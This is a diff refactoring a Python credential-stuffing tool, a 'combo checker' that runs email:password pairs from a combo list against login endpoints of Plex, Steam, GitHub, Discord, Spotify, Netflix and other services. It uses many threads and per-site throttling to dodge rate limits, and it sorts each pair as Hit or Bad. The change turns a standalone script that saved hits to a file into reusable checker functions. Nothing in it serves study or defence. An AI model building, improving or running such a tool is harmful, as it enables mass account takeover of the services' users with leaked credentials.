@@ -2,43 +2,21 @@ import threading
 import concurrent.futures
 import requests
 import time
-import os
 from bs4 import BeautifulSoup
 
-# ================= CONFIG =================
-COMBO_FILE = "/storage/emulated/0/Download/combos.txt"
-HITS_FILE = "/storage/emulated/0/Download/hits.txt"
-THREADS = 50
-REQUESTS_PER_SECOND = 50
+MAX_RETRIES = 3
+THREADS = 20
+REQUESTS_PER_SECOND = 30
+
 websites = [
     "Plex", "Steam", "GitHub", "Origin", "BattleNet", "Roblox",
     "Discord", "Reddit", "Spotify", "Trello", "Netflix"
 ]
-MAX_RETRIES = 3
-
-# ================= VARIABLES =================
-combos = []
-hits_count = {site: 0 for site in websites}
-bad_count = {site: 0 for site in websites}
-checked_count = 0
-valid_combos = []
-lock = threading.Lock()
 
 # Throttling global per site
 last_request_time = {site: 0 for site in websites}
 throttle_lock = {site: threading.Lock() for site in websites}
 
-# ================= LOAD COMBOS =================
-if not os.path.exists(COMBO_FILE):
-    print(f"[ERROR] combos.txt not found")
-    exit()
-
-with open(COMBO_FILE, "r") as f:
-    combos = [line.strip() for line in f.readlines() if line.strip()]
-
-print(f"[INFO] Loaded {len(combos)} combos")
-
-# ================= THROTTLE =================
 def throttle(site):
     with throttle_lock[site]:
         now = time.time()
@@ -48,7 +26,7 @@ def throttle(site):
             time.sleep(min_interval - elapsed)
         last_request_time[site] = time.time()
 
-# ================= SITE LOGIN FUNCTIONS =================
+# ================= SITE CHECKER FUNCTIONS =================
 def check_plex(email, password):
     session = requests.Session()
     headers = {
@@ -246,7 +224,6 @@ def check_trello(email, password):
             time.sleep(0.1)
     return "Bad"
 
-# ================= NETFLIX CHECKER =================
 def check_netflix(email, password):
     session = requests.Session()
     headers = {
@@ -256,7 +233,6 @@ def check_netflix(email, password):
         "Referer": "https://www.netflix.com/login"
     }
     
-    # First get the authentication page to get cookies
     for _ in range(MAX_RETRIES):
         try:
             throttle("Netflix")
@@ -303,51 +279,26 @@ def check_site_requests(combo, site):
         if site == "Spotify": return check_spotify(email, password)
         if site == "Trello": return check_trello(email, password)
         if site == "Netflix": return check_netflix(email, password)
+        return "Bad"  # Default for unknown sites
     except:
         return "Bad"
 
-# ================= CHECK COMBO =================
 def check_combo(combo):
-    global checked_count
     result_per_site = {}
-    hit_any = False
     for site in websites:
         status = check_site_requests(combo, site)
         result_per_site[site] = status
-        with lock:
-            if status == "Hit":
-                hits_count[site] += 1
-                hit_any = True
-            else:
-                bad_count[site] += 1
-    with lock:
-        checked_count += 1
-        if hit_any:
-            valid_combos.append(combo)
-        if checked_count % 5 == 0:
-            print_status(combo, result_per_site)
+    return result_per_site
 
-# ================= PRINT STATUS =================
-def print_status(current_combo="", results=None):
-    os.system('cls' if os.name == 'nt' else 'clear')
-    print("=== REAL COMBO CHECKER (FULL) ===\n")
-    print(f"Checking: {current_combo}\n")
-    if results:
-        for site, status in results.items():
-            print(f"[{status}] {site}")
-    print(f"\nChecked: {checked_count} | Hits: {len(valid_combos)} | Threads: {THREADS}\n")
-    for site in websites:
-        print(f"[v]{site} -> Hit:{hits_count[site]}, Bad:{bad_count[site]}")
-    print("\n")
-
-# ================= START =================
-start_time = time.time()
-with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
-    list(executor.map(check_combo, combos))
-
-with open(HITS_FILE, "w") as f:
-    for combo in valid_combos:
-        f.write(combo + "\n")
-
-end_time = time.time()
-print(f"Completed in {end_time - start_time:.2f}s | Hits: {len(valid_combos)} | Total Combos: {len(combos)}")
+def check_combo_list(combos):
+    results = []
+    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
+        combo_results = list(executor.map(check_combo, combos))
+    
+    for i, combo in enumerate(combos):
+        results.append({
+            'combo': combo,
+            'results': combo_results[i]
+        })
+    
+    return results
